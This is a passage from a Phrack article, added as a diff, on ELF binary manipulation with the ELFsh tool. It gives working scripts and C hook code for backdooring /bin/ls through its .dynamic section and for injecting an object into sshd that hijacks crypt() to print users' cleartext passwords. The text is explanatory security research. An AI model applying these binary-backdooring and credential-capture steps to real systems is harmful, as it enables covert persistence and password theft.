@@ -1,0 +1,1678 @@
+
+			      ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3d, Phile #0x08 of 0x0f
+
+|=---------- .:: Devhell Labs and Phrack Magazine present ::. ----------=|
+|=----------------------------------------------------------------------=|
+|=------------------=[  The Cerberus ELF Interface  ]=------------------=|
+|=----------------------------------------------------------------------=|
+|=------------------=[  mayhem <mayhem@devhell.org> ]=------------------=|
+
+
+ 1. Introduction
+ 2. Quick and usable backdoor in 4 bytes
+    a/ The .dynamic section
+    b/ DT_NEEDED and DT_DEBUG entries
+    c/ Performing function hijacking
+    d/ Example 1: ls and opendir()
+ 3. Residency : ET_REL injection into ET_EXEC
+    a/ Section injection : pre-interp vs post-bss
+    b/ Multiple BSS merging
+    c/ Symbol tables merging
+    d/ Mixing (a,b,c) for injecting a module into an executable
+    e/ Example 2: sshd and crypt()
+    f/ Multi-architecture algorithms
+    g/ ELFsh 0.51b relocation engine implementation details
+ 4. Infection : ALTPLT technique
+    a/ Foundations of ALTPLT
+    b/ ALTPLT on SPARC
+    c/ Example 3: md5sum and fopen64()
+    d/ Multi-architecture algorithm			
+    e/ Improvement suggestions for the redir command
+ 5. The end ?
+ 6. Greets
+ 7. References
+
+
+-------[ 1. Introduction
+
+
+	 This article introduces three new generic techniques in ELF
+	 (Executable and Linking Format) objects manipulation. The first
+	 presented one is designed to be simple and quickly implemented,
+	 others are more complex and allow advanced software extension
+	 without having the source tree. These techniques can be used for
+	 a wide panel of requirements such as closed-source software
+	 debugging, software extension, backdooring, virii writing, 
+	 intrusion detection and intrusion prevention.
+
+	 The examples will make use of the ELF shell [1], a freely
+	 available scripting language to modify ELF binaries. It works
+	 on two architectures (INTEL and SPARC) and four operating
+	 systems (Linux, NetBSD, FreeBSD, and Solaris). Moreover the
+	 techniques work even if the target machine is installed with
+	 address space randomization and execution restriction, such as
+	 PaX [2] protected boxes, since all the code injection is done
+	 in the allowed areas. 
+
+	 ELF basics -will not- be explained, if you have troubles 
+	 understanding the article, please read the ELF TIS [3] reference
+	 before requesting extra details ;). You can also try another
+	 resource [4] which is a good introduction to the ELF format, 
+	 from the virus writing perspective.
+
+	 In the first part of the paper, an easy and pragmatic technique 
+	 for backdooring an executable will be described, just by
+	 changing 4 bytes. It consists of corrupting the .dynamic section 
+	 of the binary (2) and erase some entries (DT_DEBUG) for adding 
+	 others (DT_NEEDED), plus swapping existing DT_NEEDED entries to 
+	 give priority to certain symbols, all of this without changing 
+	 the file size.
+
+	 The second part describes a complex residency technique, which 
+	 consists of adding a module (relocatable object ET_REL, e.g. a
+	 .o file) into an executable file (ET_EXEC) as if the binary was
+	 not linked yet. This technique is provided for INTEL and SPARC
+	 architectures : compiled C code can thus be added permanently
+	 to any ELF32 executable.
+
+	 Finally, a new infection technique called ALTPLT (4) will be
+	 explained. This feature is an extension of PLT infection [5]
+	 and works in correlation with the ET_REL injection. It consists
+	 of duplicating the Procedure Linkage Table and inject symbols
+	 onto each entry of the alternate PLT. The advantages of this
+	 technique are the relative portability (relative because we will
+	 see that minor architecture dependant fixes are necessary), its
+	 PaX safe bevahior as well, and the ability to call the original
+	 function from the hook function without having to perform
+	 painful tasks like runtime byte restoration.
+
+	 Example ELFsh scripts are provided for all the explained
+	 techniques. However, no ready-to-use backdoors will be included 
+	 (do you own!). For peoples who did not want to see these
+	 techniques published, I would just argue that all of
+	 them have been available for a couple of months for those
+	 who wanted, and new techniques are already in progress. These
+	 ideas were born from a good exploitation of the information
+	 provided in the ELF reference and nothing was ripped to anyone.
+	 I am not aware of any implementation providing these features,
+	 but if you feel injuried, you can send flame emails and my
+	 bot^H^H^H^H^H^H I will kindly answer all of them.
+
+
+-------[ 2. Quick and usable backdoor in 4 bytes
+
+
+	 Every dynamic executable file contains a .dynamic section. This 
+	 zone is useful for the runtime linker in order to access crucial
+	 information at runtime without requiring a section header table
+	 (SHT), since the .dynamic section data  matches the bounds of
+	 the PT_DYNAMIC segment entry of the Program Header Table (PHT).
+	 Useful information includes the address and size of relocation
+	 tables, the addresses of initialization and destruction routines,
+	 the addresses of version tables, pathes for needed libraries, and
+	 so on. Each entry of .dynamic looks like this, as shown in elf.h :
+
+
+	 typedef struct
+	 {
+	   Elf32_Sword   d_tag;                 /* Dynamic entry type */
+	   union
+	    {
+	      Elf32_Word d_val;                 /* Integer value */
+	      Elf32_Addr d_ptr;                 /* Address value */
+	    } d_un;
+	  } Elf32_Dyn;
+
+
+	 For each entry, d_tag is the type (DT_*) and d_val (or d_ptr) is
+	 the related value. Let's use the elfsh '-d' option to print the
+	 dynamic section:
+
+
+ -----BEGIN EXAMPLE 1-----
+ $ elfsh -f /bin/ls -d 
+
+  [*] Object /bin/ls has been loaded (O_RDONLY) 
+
+  [SHT_DYNAMIC]
+  [Object /bin/ls]
+
+  [00] Name of needed library          =>  librt.so.1 {DT_NEEDED}
+  [01] Name of needed library          =>   libc.so.6 {DT_NEEDED}
+  [02] Address of init function        =>  0x08048F88 {DT_INIT}
+  [03] Address of fini function        =>  0x0804F45C {DT_FINI}
+  [04] Address of symbol hash table    =>  0x08048128 {DT_HASH}
+  [05] Address of dynamic string table =>  0x08048890 {DT_STRTAB}
+  [06] Address of dynamic symbol table =>  0x08048380 {DT_SYMTAB}
+  [07] Size of string table            =>   821 bytes {DT_STRSZ}
+  [08] Size of symbol table entry      =>    16 bytes {DT_SYMENT}
+  [09] Debugging entry (unknown)       =>  0x00000000 {DT_DEBUG}
+  [10] Processor defined value         =>  0x0805348C {DT_PLTGOT}
+  [11] Size in bytes for .rel.plt      =>   560 bytes {DT_PLTRELSZ}
+  [12] Type of reloc in PLT            =>          17 {DT_PLTREL}
+  [13] Address of .rel.plt             =>  0x08048D58 {DT_JMPREL}
+  [14] Address of .rel.got section     =>  0x08048D20 {DT_REL}
+  [15] Total size of .rel section      =>    56 bytes {DT_RELSZ}
+  [16] Size of a REL entry             =>     8 bytes {DT_RELENT}
+  [17] SUN needed version table        =>  0x08048CA0 {DT_VERNEED}
+  [18] SUN needed version number       =>           2 {DT_VERNEEDNUM}
+  [19] GNU version VERSYM              =>  0x08048BFC {DT_VERSYM}
+
+  [*] Object /bin/ls unloaded 
+
+ $
+ -----END EXAMPLE 1-----
+ 
+
+	 The careful reader would have noticed a strange entry of type 
+	 DT_DEBUG. This entry is used in the runtime linker to retrieve
+	 debugging information, it is present in all GNU tools generated
+	 binaries but it is not mandatory. The idea is to erase it using
+	 a forged DT_NEEDED, so that an extra library dependance is added
+	 to the executable.
+
+	 The d_val field of a DT_NEEDED entry contains a relative offset
+	 from the beginning of the .dynstr section, where we can find the
+	 library path for this entry. What happens if we want to avoid
+	 injecting an extra library path string into the .dynstr
+	 section ?
+
+
+ -----BEGIN EXAMPLE 2-----
+ $ elfsh -f /bin/ls -X dynstr | grep so
+ .dynstr + 16  6C69 6272 742E 736F 2E31 0063 6C6F 636B librt.so.1.clock
+ .dynstr + 48  696E 5F75 7365 6400 6C69 6263 2E73 6F2E in_used.libc.so.
+ .dynstr + 176 726E 616C 0071 736F 7274 006D 656D 6370 rnal.qsort.memcp
+ .dynstr + 784 6565 006D 6273 696E 6974 005F 5F64 736F ee.mbsinit.__dso
+ $
+ -----END EXAMPLE 2-----
+
+
+	 We just have to choose an existing library path string, but 
+	 avoid starting at the beginning ;). The ELF reference specifies
+	 clearly that a same string in .dynstr can be used by multiple
+	 entries at a time:
+
+
+ -----BEGIN EXAMPLE 3-----
+ $ cat > /tmp/newlib.c 
+ function()
+ {
+   printf("my own fonction \n");
+ }
+ $ gcc -shared /tmp/newlib.c -o /lib/rt.so.1
+ $ elfsh
+
+  Welcome to The ELF shell 0.5b9 .::. 
+
+  .::. This software is under the General Public License 
+  .::. Please visit http://www.gnu.org to know about Free Software 
+
+ [ELFsh-0.5b9]$ load /bin/ls 
+   [*] New object /bin/ls loaded on Mon Apr 28 23:09:55 2003
+
+ [ELFsh-0.5b9]$ d DT_NEEDED|DT_DEBUG
+
+ [SHT_DYNAMIC]
+ [Object /bin/ls]
+
+ [00] Name of needed library            =>          librt.so.1 {DT_NEEDED}
+ [01] Name of needed library            =>           libc.so.6 {DT_NEEDED}
+ [09] Debugging entry (unknown)         =>          0x00000000 {DT_DEBUG}
+
+ [ELFsh-0.5b9]$ set 1.dynamic[9].tag DT_NEEDED
+  [*] Field set succesfully 
+
+ [ELFsh-0.5b9]$ set 1.dynamic[9].val 19	# see .dynstr + 19
+  [*] Field set succesfully 
+
+ [ELFsh-0.5b9]$ save /tmp/ls.new
+  [*] Object /tmp/ls.new saved successfully
+
+ [ELFsh-0.5b9]$ quit
+  [*] Unloading object 1 (/bin/ls) * 
+
+  Good bye ! .::. The ELF shell 0.5b9 
+
+ $ 
+ -----END EXAMPLE 3-----
+
+	 
+	 Lets verify our changes:
+
+
+ -----BEGIN EXAMPLE 4-----
+ $ elfsh -f ls.new -d DT_NEEDED
+
+ [*] Object ls.new has been loaded (O_RDONLY) 
+
+ [SHT_DYNAMIC]
+ [Object ls.new]
+ 
+ [00] Name of needed library            =>          librt.so.1 {DT_NEEDED}
+ [01] Name of needed library            =>           libc.so.6 {DT_NEEDED}
+ [09] Name of needed library            =>             rt.so.1 {DT_NEEDED}
+
+ [*] Object ls.new unloaded 
+
+ $ ldconfig		     # refresh /etc/ld.so.cache
+ $ 
+ -----END EXAMPLE 4-----
+
+
+	 This method is not extremely stealth because a simple command can
+	 list all the library dependances for a given binary:
+
+
+ $ ldd /tmp/ls.new
+         librt.so.1 => /lib/librt.so.1 (0x40021000)
+	 libc.so.6 => /lib/libc.so.6 (0x40033000)
+	 rt.so.1 => /lib/rt.so.1 (0x40144000)
+	 libpthread.so.0 => /lib/libpthread.so.0 (0x40146000)
+	 /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
+ $ 
+
+
+	 Is the executable still working?
+
+
+ $ ./ls.new
+ AcroOlAAFj  ELFSH_DEBUG  ls.new  newlib.c
+ $ 
+
+
+	 OK, so we found a good way to inject as much code as we want in
+	 a process, by adding a library dependance to the main object, the
+	 executable object. Now what if we want to hijack functions with
+	 such an easy technique? We can force some symbols to get resolved
+	 in priority over other symbols : when the runtime relocation is 
+	 done (when the .got section is patched), the runtime linker will
+	 iterate on the link_map [6] [7] [8] list, find the first matching
+	 symbol, and fill the Global Offset Table related entry (or the 
+	 Procedure Linkage Table entry if we are on SPARC) with the 
+	 absolute runtime address where the function is mapped. A simple 
+	 technique consists of swapping DT_NEEDED entries and make our own
+	 library to be present before other libraries in the link_map
+	 double linked list, and symbols to be resolved before the
+	 original symbols. In order to call the original function from
+	 the hook function, we will have to use dlopen(3) and dlsym(3) so
+	 that we can resolve a symbol for a given object.
+
+	 Lets take the same code, and this time, write a script which can
+	 hijack opendir(3) to our own function(), and then call the 
+	 original opendir(), so that the binary can be run normally:
+
+
+ -----BEGIN EXAMPLE 5-----
+ $ cat dlhijack.esh
+ #!/usr/bin/elfsh
+ 
+ load /bin/ls
+
+ # Move DT_DEBUG into DT_NEEDED
+ set 1.dynamic[9].tag DT_NEEDED
+
+ # Put the former DT_DEBUG entry value to the first DT_NEEDED value
+ set 1.dynamic[9].val 1.dynamic[0].val
+
+ # Add 3 to the first DT_NEEDED value => librt.so.1 becomes rt.so.1 
+ add 1.dynamic[0].val 3
+
+ save ls.new
+ quit
+
+ $ 
+ -----END EXAMPLE 5-----
+
+
+	 Now let's write the opendir hook code:
+
+
+ -----BEGIN EXAMPLE 6-----
+ $ cat myopendir.c
+ #include <stdio.h>
+ #include <sys/types.h>
+ #include <stdlib.h>
+ #include <fcntl.h>
+ #include <dirent.h>
+ #include <dlfcn.h>
+
+ #define LIBC_PATH       "/lib/libc.so.6"
+
+ DIR     *opendir(const char *name)
+ {
+   void  *handle;
+   void  *(*sym)(const char *name);
+
+   handle = dlopen(LIBC_PATH, RTLD_LAZY);
+   sym = (void *) dlsym(handle, "opendir");
+   printf("OPENDIR HIJACKED -orig- = %08X .::. -param- = %s \n", 
+			   sym, name);
+   return (sym(name));
+ }
+ $ gcc -shared myopendir.c -o rt.so.1 -ldl
+ $
+ -----END EXAMPLE 6-----
+
+
+	 Now we can modify the binary using our 4 lines script:
+
+
+ -----BEGIN EXAMPLE 7-----
+ $ ./dlhijack.esh
+
+   Welcome to The ELF shell 0.5b9 .::. 
+
+   .::. This software is under the General Public License 
+   .::. Please visit http://www.gnu.org to know about Free Software 
+
+   ~load /bin/ls
+     [*] New object /bin/ls loaded on Fri Jul 25 02:48:19 2003
+ 
+   ~set 1.dynamic[9].tag DT_NEEDED
+     [*] Field set succesfully 
+
+   ~set 1.dynamic[9].val 1.dynamic[0].val
+     [*] Field set succesfully 
+
+   ~add 1.dynamic[0].val 3
+     [*] Field modified succesfully
+
+   ~save ls.new
+     [*] Object ls.new save successfully 
+
+    ~quit
+     [*] Unloading object 1 (/bin/ls) * 
+
+  Good bye ! .::. The ELF shell 0.5b9 
+
+ $
+ -----END EXAMPLE 7-----
+
+
+	Let's see the results for the original ls, and then for the
+	modified ls:
+
+
+ $ ldd ls.new
+        rt.so.1 => /lib/rt.so.1 (0x40021000)
+        libc.so.6 => /lib/libc.so.6 (0x40023000)
+        librt.so.1 => /lib/librt.so.1 (0x40134000)
+        libdl.so.2 => /lib/libdl.so.2 (0x40146000)
+        /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
+        libpthread.so.0 => /lib/libpthread.so.0 (0x4014a000)
+ $ ls
+ c.so.6  dlhijack.esh  dlhijack.esh~  ls.new  myopendir.c  \
+ myopendir.c~  p61_ELF.txt  p61_ELF.txt~  rt.so.1
+ $ ./ls.new 
+ OPENDIR HIJACKED -orig- = 400C1D5C .::. -param- = . 
+ c.so.6  dlhijack.esh  dlhijack.esh~  ls.new  myopendir.c \
+ myopendir.c~  p61_ELF.txt  p61_ELF.txt~  rt.so.1
+ $
+
+
+	Nice. Note that the current implementation of this technique in 
+	ELFsh changes the size of the binary because it injects 
+	automatically some symbols for binary sanity. If you want to keep 
+	the same size, you have to comment the calls to elfsh_fixup_symtab
+	in the ELFsh source code ;) . This stuff is known to be used
+	in the wild.
+
+	The dynamic version of this technique has been proposed in [9],
+	where the author describes how to call dlopen() in a subversive
+	way, so that the process get runtime linked with an extra library.
+	In practice, both implementations have nothing in common, but it
+	is worth mentionning.
+
+
+-------[ 3. Residency : ET_REL injection into ET_EXEC
+
+
+	 This second technique allows to perform relinking of the ELF
+	 ET_EXEC binary file and adding a relocatable object (ET_REL
+	 file aka .o file) into the program address space. This is very
+	 useful since it is a powerful method to inject as much data and
+	 code as needed in a file using a 5 lines script.
+
+	 Such relocation based backdoors have been developped in the 
+	 past for static kernel patching [10] (ET_REL into vmlinuz) and
+	 direct LKM loading in kernel memory (ET_REL into kmem) [11] .
+	 However, this ET_REL injection into ET_EXEC implementation is in
+	 my sense particulary interresting since it has been implemented 
+	 considering a larger scope of target architectures and for
+	 protected environments.
+
+	 Because ELFsh is also used for things other than backdooring, 
+	 the SHT and the symbol table are kept synchronized when we
+	 insert our stuff into the binary, so that symbol resolving can
+	 be provided even in the injected code.
+
+	 Since the backdoor needs to stay valid on a PaX protected box,
+	 we use 2 different injection techniques (one for the code 
+	 sections, the other for the data sections) called section
+	 pre-interp injection (because we insert the new section before
+	 the .interp section) and section post-bss injection (because we
+	 insert the new section after the .bss section).
+
+	 For this second injection type, .bss data physical insertion 
+	 into the file is necessary, since .bss is the non-initialized 
+	 data section, it is only referenced by the SHT and PHT, but it
+	 is not present in the file.
+
+	 Also, note that section pre-interp injection is not possible 
+	 with the current FreeBSD dynamic linker (some assert() kills the
+	 modified binary), so all sections are injected using a post-bss 
+	 insertion on this OS. This is not an issue since FreeBSD does not
+	 come with non-executable protection for datapages. If such a 
+	 protection comes in the future, we would have to modify the 
+	 dynamic linker itself before being able to run the modified
+	 binary, or make the code segment writable in sh_flags.
+
+	 Let's look at the binary layout (example is sshd, it is the same
+	 for all the binaries) :
+
+
+ -----BEGIN EXAMPLE 8-----
+ $ elfsh -f /usr/sbin/sshd -q -s -p
+
+[SECTION HEADER TABLE .::. SHT is not stripped]
+[Object /usr/sbin/sshd]
+
+[000] (nil)      -------                 foff:00000000 sz:00000000 link:00
+[001] 0x80480f4  a------ .interp         foff:00000244 sz:00000019 link:00
+[002] 0x8048108  a------ .note.ABI-tag   foff:00000264 sz:00000032 link:00
+[003] 0x8048128  a------ .hash           foff:00000296 sz:00001784 link:04
+[004] 0x8048820  a------ .dynsym         foff:00002080 sz:00003952 link:05
+[005] 0x8049790  a------ .dynstr         foff:00006032 sz:00002605 link:00
+[006] 0x804a1be  a------ .gnu.version    foff:00008638 sz:00000494 link:04
+[007] 0x804a3ac  a------ .gnu.version_r  foff:00009132 sz:00000096 link:05
+[008] 0x804a40c  a------ .rel.got        foff:00009228 sz:00000008 link:04
+[009] 0x804a414  a------ .rel.bss        foff:00009236 sz:00000056 link:04
+[010] 0x804a44c  a------ .rel.plt        foff:00009292 sz:00001768 link:04
+[011] 0x804ab34  a-x---- .init           foff:00011060 sz:00000037 link:00
+[012] 0x804ab5c  a-x---- .plt            foff:00011100 sz:00003552 link:00
+[013] 0x804b940  a-x---- .text           foff:00014656 sz:00145276 link:00
+[014] 0x806f0bc  a-x---- .fini           foff:00159932 sz:00000028 link:00
+[015] 0x806f0e0  a------ .rodata         foff:00159968 sz:00068256 link:00
+[016] 0x8080b80  aw----- .data           foff:00228224 sz:00003048 link:00
+[017] 0x8081768  aw----- .eh_frame       foff:00231272 sz:00000004 link:00
+[018] 0x808176c  aw----- .ctors          foff:00231276 sz:00000008 link:00
+[019] 0x8081774  aw----- .dtors          foff:00231284 sz:00000008 link:00
+[020] 0x808177c  aw----- .got            foff:00231292 sz:00000900 link:00
+[021] 0x8081b00  aw----- .dynamic        foff:00232192 sz:00000200 link:05
+[022] 0x8081bc8  -w----- .sbss           foff:00232416 sz:00000000 link:00
+[023] 0x8081be0  aw----- .bss            foff:00232416 sz:00025140 link:00
+[024] (nil)      ------- .comment        foff:00232416 sz:00002812 link:00
+[025] (nil)      ------- .note           foff:00235228 sz:00001480 link:00
+[026] (nil)      ------- .shstrtab       foff:00236708 sz:00000243 link:00
+[027] (nil)      ------- .symtab         foff:00236951 sz:00000400 link:00
+[028] (nil)      ------- .strtab         foff:00237351 sz:00000202 link:00
+
+[Program header table .::. PHT]
+[Object /usr/sbin/sshd]
+
+[0] 0x08048034 -> 0x080480F4 r-x memsz(000192) foff(000052) filesz(000192)
+[1] 0x080480F4 -> 0x08048107 r-- memsz(000019) foff(000244) filesz(000019)
+[2] 0x08048000 -> 0x0807FB80 r-x memsz(228224) foff(000000) filesz(228224)
+[3] 0x08080B80 -> 0x08087E14 rw- memsz(029332) foff(228224) filesz(004168)
+[4] 0x08081B00 -> 0x08081BC8 rw- memsz(000200) foff(232192) filesz(000200)
+[5] 0x08048108 -> 0x08048128 r-- memsz(000032) foff(000264) filesz(000032)
+
+[Program header table .::. SHT correlation]
+[Object /usr/sbin/sshd]
+
+[*] SHT is not stripped 
+
+[00] PT_PHDR    
+[01] PT_INTERP         .interp 
+[02] PT_LOAD           .interp .note.ABI-tag .hash .dynsym .dynstr \
+		       .gnu.version .gnu.version_r .rel.got .rel.bss \
+		       .rel.plt .init .plt .text .fini .rodata 
+[03] PT_LOAD           .data .eh_frame .ctors .dtors .got .dynamic 
+[04] PT_DYNAMIC        .dynamic 
+[05] PT_NOTE           .note.ABI-tag 
+
+ $
+ -----END EXAMPLE 8-----
+
+
+	We have here two loadable segments, one is executable (matches the
+	code segment) and the other is writable (matches the data 
+	segment).
+
+	What we have to do is to inject all non-writable sections before
+	.interp (thus in the code segment), and all other section's after
+	.bss in the data segment. Let's code a handler for crypt() which
+	prints the clear password and exit. In this first example, we 
+	will use GOT redirection [12] and hijack crypt() which stays in 
+	the libc:
+
+
+ -----BEGIN EXAMPLE 9-----
+ $ cat mycrypt.c
+ #include <stdio.h>
+ #include <stdlib.h>
+ #include <unistd.h>
+ #include <fcntl.h>
+
+ int     glvar = 42;
+ int     bssvar;
+
+ char *mycrypt(const char *key, const char *salt)
+ {
+   bssvar = 2;
+   printf(".:: crypt redirected -key- = %s (%u .::. %u) \n", 
+         key, glvar, bssvar);
+   exit(0);
+ }
+ $ gcc -c mycrypt.c
+ $
+ -----END EXAMPLE 9-----
+
+
+	Using the 'reladd' command, we will inject mycrypt.o into sshd:
+
+
+ -----BEGIN EXAMPLE 10-----
+ $ cat etreladd.esh
+ #!/usr/bin/elfsh
+
+ load /usr/sbin/sshd
+ load mycrypt.o
+
+ # Inject mycrypt.o into sshd
+ reladd 1 2
+
+ # Modify crypt() got entry and make it point on mycrypt() which resides
+ # into mycrypt.o
+ set 1.got[crypt] mycrypt
+
+ save sshd.new
+ quit
+ 
+ $ ./etreladd.esh
+
+         Welcome to The ELF shell 0.5b9 .::. 
+
+         .::. This software is under the General Public License 
+         .::. Please visit http://www.gnu.org to know about Free Software 
+
+~load /usr/sbin/sshd
+  [*] New object /usr/sbin/sshd loaded on Fri Jul 25 04:43:58 2003
+
+~load mycrypt.o
+  [*] New object mycrypt.o loaded on Fri Jul 25 04:43:58 2003
+ 
+~reladd 1 2
+  [*] ET_REL mycrypt.o injected succesfully in ET_EXEC /usr/sbin/sshd
+
+~set 1.got[crypt] mycrypt
+  [*] Field set succesfully 
+
+~save sshd.new
+  [*] Object sshd.new save successfully 
+
+~quit
+ [*] Unloading object 1 (mycrypt.o)   
+ [*] Unloading object 2 (/usr/sbin/sshd) * 
+
+         Good bye ! .::. The ELF shell 0.5b9 
+ $
+ -----END EXAMPLE 10-----
+
+
+	Our script rocked. As I said, the symbol tables and the .bss from
+	the module have been fused with those from the executable file
+	and the SHT has been kept synchronized, so that resolving is also
+	possible in the injected code:
+
+ 
+ -----BEGIN EXAMPLE 11-----
+ $ elfsh -f sshd.new -q -s -p
+[SECTION HEADER TABLE .::. SHT is not stripped]
+[Object sshd.new]
+
+[00] (nil)      -------                 foff:00000000 sz:00000000 link:00
+[01] 0x80450f4  a-x---- .orig.plt       foff:00000244 sz:00004096 link:00
+[02] 0x80460f4  a------ mycrypt.o.rodata foff:00004340 sz:00004096 link:00
+[03] 0x80470f4  a-x---- mycrypt.o.text  foff:00008436 sz:00004096 link:00
+[04] 0x80480f4  a------ .interp         foff:00012532 sz:00000019 link:00
+[05] 0x8048108  a------ .note.ABI-tag   foff:00012552 sz:00000032 link:00
+[06] 0x8048128  a------ .hash           foff:00012584 sz:00001784 link:07
+[07] 0x8048820  a------ .dynsym         foff:00014368 sz:00003952 link:08
+[08] 0x8049790  a------ .dynstr         foff:00018320 sz:00002605 link:00
+[09] 0x804a1be  a------ .gnu.version    foff:00020926 sz:00000494 link:07
+[10] 0x804a3ac  a------ .gnu.version_r  foff:00021420 sz:00000096 link:08
+[11] 0x804a40c  a------ .rel.got        foff:00021516 sz:00000008 link:07
+[12] 0x804a414  a------ .rel.bss        foff:00021524 sz:00000056 link:07
+[13] 0x804a44c  a------ .rel.plt        foff:00021580 sz:00001768 link:07
+[14] 0x804ab34  a-x---- .init           foff:00023348 sz:00000037 link:00
+[15] 0x804ab5c  a-x---- .plt            foff:00023388 sz:00003552 link:00
+[16] 0x804b940  a-x---- .text           foff:00026944 sz:00145276 link:00
+[17] 0x806f0bc  a-x---- .fini           foff:00172220 sz:00000028 link:00
+[18] 0x806f0e0  a------ .rodata         foff:00172256 sz:00068256 link:00
+[19] 0x8080b80  aw----- .data           foff:00240512 sz:00003048 link:00
+[20] 0x8081768  aw----- .eh_frame       foff:00243560 sz:00000004 link:00
+[21] 0x808176c  aw----- .ctors          foff:00243564 sz:00000008 link:00
+[22] 0x8081774  aw----- .dtors          foff:00243572 sz:00000008 link:00
+[23] 0x808177c  aw----- .got            foff:00243580 sz:00000900 link:00
+[24] 0x8081b00  aw----- .dynamic        foff:00244480 sz:00000200 link:08
+[25] 0x8081bc8  -w----- .sbss           foff:00244704 sz:00000000 link:00
+[26] 0x8081be0  aw----- .bss            foff:00244704 sz:00025144 link:00
+[27] 0x8087e18  aw----- mycrypt.o.data  foff:00269848 sz:00000004 link:00
+[28] (nil)      ------- .comment        foff:00269852 sz:00002812 link:00
+[29] (nil)      ------- .note           foff:00272664 sz:00001480 link:00
+[30] (nil)      ------- .shstrtab       foff:00274144 sz:00000300 link:00
+[31] (nil)      ------- .symtab         foff:00274444 sz:00004064 link:00
+[32] (nil)      ------- .strtab         foff:00278508 sz:00003423 link:00
+
+[Program header table .::. PHT]
+[Object sshd.new]
+
+[0] 0x08045034 -> 0x080450F4 r-x memsz(000192) foff(000052) filesz(000192)
+[1] 0x080480F4 -> 0x08048107 r-- memsz(000019) foff(012532) filesz(000019)
+[2] 0x08045000 -> 0x0807FB80 r-x memsz(240512) foff(000000) filesz(240512)
+[3] 0x08080B80 -> 0x08087E1C rw- memsz(029340) foff(240512) filesz(029340)
+[4] 0x08081B00 -> 0x08081BC8 rw- memsz(000200) foff(244480) filesz(000200)
+[5] 0x08048108 -> 0x08048128 r-- memsz(000032) foff(012552) filesz(000032)
+
+[Program header table .::. SHT correlation]
+[Object sshd.new]
+
+[*] SHT is not stripped 
+ 
+[0] PT_PHDR    
+[1] PT_INTERP         .interp 
+[2] PT_LOAD           .orig.plt mycrypt.o.rodata mycrypt.o.text .interp 
+		      .note.ABI-tag .hash .dynsym .dynstr .gnu.version  
+		      .gnu.version_r .rel.got .rel.bss .rel.plt .init   
+		      .plt .text .fini .rodata 
+[3] PT_LOAD           .data .eh_frame .ctors .dtors .got .dynamic .sbss
+		      .bss mycrypt.o.data 
+[4] PT_DYNAMIC        .dynamic 
+[5] PT_NOTE           .note.ABI-tag 
+
+ $
+ -----END EXAMPLE 11-----	
+
+
+	The new sections can be easily spotted in the new SHT, since
+	their name starts with the module name (mycrypt.o.*). Please
+	elude the .orig.plt presence for the moment. This section 
+	is injected at ET_REL insertion time, but it is not used in 
+	this example and it will be explained as a stand-alone technique
+	in the next chapter.
+
+	We can see that the new BSS size is 4 bytes bigger than the
+	original one. It is because the module BSS was only filled with
+	one variable (bssvar), which was a 4 bytes sized integer since
+	this specific example was done on a 32 bits architecture. The
+	difficulty of this operation is to find the ET_REL object BSS
+	section size, because it is set to 0 in the SHT. For this
+	operation, we need to care about variable address alignement
+	using the st_value field from each SHN_COMMON symbols of the
+	ET_REL object, as specified by the ELF reference. Details for
+	this algorithm are given later in the article.
+
+	It works on Solaris as well, even if ET_REL files generated by
+	Solaris-ELF ld have no .bss section entry in the SHT. The 0.51b2
+	implementation has one more limitation on Solaris, which
+	is a 'Malloc problem' happening at the first malloc() call when
+	using a section post-bss injection. You dont have to use this kind
+	of section injection ; ET_REL injection works well on Solaris if
+	you do not use initialized global variables. This problem has been
+	solved in 0.51b3 by shifting _end, _edata, and _END_ dynamic symbols
+	so that they still points on the beginning of the heap (e.g. at
+	the end of the last post-bss mapped section, or at the end of the
+	bss, if there is no post-bss mapped section).
+
+	Also, the .shstrtab, .symtab, and .strtab sections have been
+	extended, and now contain extra symbol names, extra section names,
+	and extra symbols copied from the ET_REL object.
+
+	You can note that pre-interp injected sections base address is
+	congruent getpagesize(), so that the executable segment always
+	starts at the beginning of a page, as requested by the ELF
+	reference. ELFsh could save some place here, instead of allocating
+	the size of a page each time a section is injected, but that would
+	complexify the algorithm a bit, so the congruence is kept for 
+	each inserted section.
+	
+	The implementation has the cool advantage of -NOT- having to move
+	the original executable address space, so that no relocation of
+	the original code is needed. In other words, only the .o object
+	sections are relocated and we can be sure that no false positive
+	relocation is possible (e.g. we -DO NOT- have to find all
+	references in the sshd code and patch them because the address
+	space changed).
+
+	This is the injected code section's assembly dump, which contains 
+	the mycrypt function:
+
+
+ -----BEGIN EXAMPLE 12-----
+ $ elfsh -f sshd.new -q -D mycrypt.o.text
+
+ 080470F4 mycrypt.o.text + 0            push          %ebp             
+ 080470F5 mycrypt.o.text + 1            mov           %esp,%ebp        
+ 080470F7 mycrypt.o.text + 3            sub           $8,%esp          
+ 080470FA mycrypt.o.text + 6            mov           $2,<bssvar>      
+ 08047104 mycrypt.o.text + 16           mov           <bssvar>,%eax    
+ 08047109 mycrypt.o.text + 21           push          %eax             
+ 0804710A mycrypt.o.text + 22           mov           <glvar>,%eax     
+ 0804710F mycrypt.o.text + 27           push          %eax             
+ 08047110 mycrypt.o.text + 28           mov           8(%ebp),%eax     
+ 08047113 mycrypt.o.text + 31           push          %eax             
+ 08047114 mycrypt.o.text + 32           push          $<mycrypt.o.rodata> 
+ 08047119 mycrypt.o.text + 37           call          <printf>         
+ 0804711E mycrypt.o.text + 42           add           $10,%esp         
+ 08047121 mycrypt.o.text + 45           add           $0xFFFFFFF4,%esp   
+ 08047124 mycrypt.o.text + 48           push          $0               
+ 08047126 mycrypt.o.text + 50           call          <exit>           
+ 0804712B mycrypt.o.text + 55           add           $10,%esp         
+ 0804712E mycrypt.o.text + 58           lea           0(%esi),%esi     
+ 08047134 mycrypt.o.text + 64           leave      
+ 08047135 mycrypt.o.text + 65           ret
+ -----END EXAMPLE 12-----
+
+
+	 Lets test our new sshd:
+
+
+ $ ssh mayhem@localhost
+ Enter passphrase for key '/home/mayhem/.ssh/id_dsa': <-- type <ENTER>
+ mayhem@localhost's password: <--- type your passwd
+ Connection closed by 127.0.0.1
+ $ 
+ 
+
+	Let's verify on the server side what happened:
+
+
+ $ ./sshd.new -d 
+debug1: Seeding random number generator
+debug1: sshd version OpenSSH_3.0.2p1
+debug1: private host key: #0 type 0 RSA1
+debug1: read PEM private key done: type RSA
+debug1: private host key: #1 type 1 RSA
+debug1: read PEM private key done: type DSA
+debug1: private host key: #2 type 2 DSA
+debug1: Bind to port 22 on 0.0.0.0.
